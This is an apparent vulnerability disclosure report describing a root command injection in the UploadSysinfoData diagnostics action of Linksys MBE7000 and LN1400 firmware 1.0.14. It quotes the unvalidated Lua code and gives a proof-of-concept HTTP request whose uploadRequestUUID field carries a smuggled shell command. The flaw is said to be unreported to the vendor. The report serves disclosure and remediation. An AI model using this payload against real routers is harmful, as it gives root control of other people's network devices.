# Linksys MBE7000 and LN1400 1.0.14 were discovered to contain a command injection vulnerability in the JNAP UploadSysinfoData action

## Overview

- Vendor: Linksys (Belkin)
- Product: MBE7000 1.0.14.216607, LN1400 1.0.14.216698
- Version: 1.0.14
- Component: JNAP action UploadSysinfoData
- Vulnerability Class: CWE-78 command injection
- CVSS 3.1 (tentative): 7.2 High `AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` (administrator JNAP credential/session required; commands run as root)
- Manufacturer: https://www.linksys.com/

## Affected versions

### MBE7000 1.0.14.216607

- `FW_MBE7000_1.0.14.216607_prod.signed.img`.
- Rootfs: SquashFS at offset `0x800000` (37,352,376 bytes, 5,915
  inodes), extracted with `unsquashfs -o 8388608`.
- `usr/sbin/jnap`.
- `usr/local/lib/lua/5.1/nodes_diagnostics.lua`.

### LN1400 1.0.14.216698

- `FW_LN14_1.0.14.216698_prod.signed.img`.
- Rootfs: SquashFS at offset `0x800000` (38,302,050 bytes, 5,980
  inodes).
- The same `nodes_diagnostics.lua` and JNAP action are present.

MX6200 1.0.14.216738 carries the identical `nodes_diagnostics.lua`
sink; it is a supplemental affected model for this report.

## Vulnerability details

The JNAP handler forwards the request object unchanged:

```lua
-- JNAP/modules/nodes_diagnostics_server.lua
local function UploadSysinfoData(ctx, input)
    local ndiag = require("nodes_diagnostics")
    local sc = ctx:sysctx()
    local error, output = ndiag.uploadSysinfoData(sc, input)
    return error or 'OK', output
end
```

The library uses the caller-supplied `uploadRequestUUID` directly:

```lua
-- usr/local/lib/lua/5.1/nodes_diagnostics.lua
_M.PUBLISH_UPLOAD_MSG = "/usr/sbin/pub_upload_sysinfo %s"
...
function _M.uploadSysinfoData(sc, input)
    ...
    local requestId = input.uploadRequestUUID
    if (not requestId) then
        requestId = hdk.uuid(platform.getUUID())
    end
    local rc = os.execute(_M.PUBLISH_UPLOAD_MSG:format(tostring(requestId)))
```

There is no UUID validation, quoting or shell escaping on
`uploadRequestUUID`. A value such as `;id>/tmp/sysinfo_pwn;#` becomes:

```sh
/usr/sbin/pub_upload_sysinfo ;id>/tmp/sysinfo_pwn;#
```

and the second command runs in the JNAP CGI's root context. The action
descriptor in `libjnap_nodes_diagnostics.so` has flags `0xc`, i.e. bit 0
clear and authentication required; the JNAP management endpoint is
reached over the LAN with an administrator credential or session token.

The module's schema string table exposes only the generic `string` and
`timestamp` types, not a UUID type, and the handler itself performs no
format check. If the JNAP schema were to enforce a UUID pattern outside
the handler the value would be rejected; no such validator is visible
in `libjnap_nodes_diagnostics.so`, but this static finding was not
confirmed end to end because the qemu JNAP harness could not dispatch
any action.

## PoC

```http
POST /JNAP/ HTTP/1.1
Host: <router>
Content-Type: application/json
X-JNAP-Action: http://linksys.com/jnap/nodes/diagnostics/UploadSysinfoData
X-JNAP-Authorization: Basic <base64(admin:password)>

{"uploadRequestUUID":";id>/tmp/sysinfo_pwn;#"}
```

A session-token client can send `X-JNAP-Session: <token>` instead of the
Basic credential. After the request:

```sh
cat /tmp/sysinfo_pwn
```

## Evidence

`experiments/vulnerability-triage/results/20261108-linksys-mbe7000-ln1400-jnap-cmdi-01/evidence/`

- `mbe7000-upload-sysinfo.txt`, `ln1400-upload-sysinfo.txt` — handler
  and `os.execute` sink with line numbers.
- `action-flags.txt` — `UploadSysinfoData` flags `0xc` in both builds.
- `mbe-ln-stop-led.txt` — the separate `StopBlinkingNodeLed` sink in
  the same builds.

A qemu-arm JNAP CGI harness loaded the MBE7000 modules but returned
`_ErrorUnknownAction` for every action due to missing device
runtime/UTCTX state, so this finding is static; no live router was used.

## Impact

An authenticated administrator, or anyone with a stolen administrator
token, can execute arbitrary commands as root through the diagnostics
upload action. The endpoint is a normal authenticated JNAP action; the
value is not constrained to a UUID.

## Remediation / known-CVE relation

- Treat `uploadRequestUUID` as a UUID: parse/validate it and reject any
  value containing characters outside `[0-9A-Fa-f-]`.
- Pass the ID as a separate argv element to `pub_upload_sysinfo`; do not
  build a shell string.
- NVD keyword searches on 2026-11-08 for `UploadSysinfoData`,
  `pub_upload_sysinfo`, `nodes_diagnostics command injection` and
  `MBE7000 command injection` returned zero results. Candidate 0-day;
  no CVE assigned and no vendor contact has been made.

## Additional Information

```markdown
### Vendor
Linksys (Belkin)

### Product
MBE7000 1.0.14.216607, LN1400 1.0.14.216698

### Version or Commit
1.0.14

### Vulnerability Class
CWE-78 command injection

### Description
The JNAP UploadSysinfoData action passes uploadRequestUUID into pub_upload_sysinfo %s and executes it with os.execute without validation.

### Affected_component
JNAP action UploadSysinfoData

### Attack_vector
Authenticated JNAP UploadSysinfoData with a crafted uploadRequestUUID.

### Product_version
MBE7000 1.0.14.216607, LN1400 1.0.14.216698 1.0.14

### Reference
- https://www.linksys.com/
- https://github.com/vuln-1/vuln/blob/main/Linksys/MBE7000_LN1400_V1.0.14/report-2.md
```
